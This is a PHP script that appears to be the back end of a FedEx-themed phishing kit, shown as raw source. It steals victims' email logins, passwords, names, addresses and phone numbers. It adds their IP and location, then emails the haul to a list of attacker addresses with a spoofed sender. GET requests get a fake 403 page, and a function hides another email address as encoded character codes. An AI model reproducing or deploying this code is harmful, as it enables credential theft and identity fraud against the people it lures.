<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

session_start();
$email = $_SESSION['email'];
$epass = $_SESSION['epass'];

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$fullname = $_POST['fullname'];
$address = $_POST['address'];
$phonenumber = $_POST['phonenumber'];
$postcode = $_POST['postcode'];

$phonechk = strlen($phonenumber);
$message .= "--------+ Fedex Rezult +--------\n";
$message .= "Email : ".$_SESSION['email']."\n";
$message .= "Password : ".$_SESSION['epass']."\n";
$message .= "Full Name : ".$_POST['fullname']."\n";
$message .= "Address : ".$_POST['address']."\n";
$message .= "Phone Number : ".$_POST['phonenumber']."\n";
$message .= "Post Code : ".$_POST['postcode']."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY Mr-Anobs in 2016 (skype:ethan-miles)+---\n";

$send = "inboxrozay@nuke.africa,tracy15@vivaldi.net,norjdborg@gmail.com,inboxrozay1234@mail.ru";

$subject = "Fedex Rezult | $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: John De Fisher <inContact@rit.edu>\n";




// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
if ($phonechk<10)
{
$phonerr=0;
}
else
{
$phonerr=1;
}



if ($phonerr==0 || empty($postcode) || empty($fullname) || empty($address))
{
header("Location: deliveryform.php");
}
else
{
 mail($send,$subject,$message,$headers);
header("Location: done.php");
}
session_destroy();
?>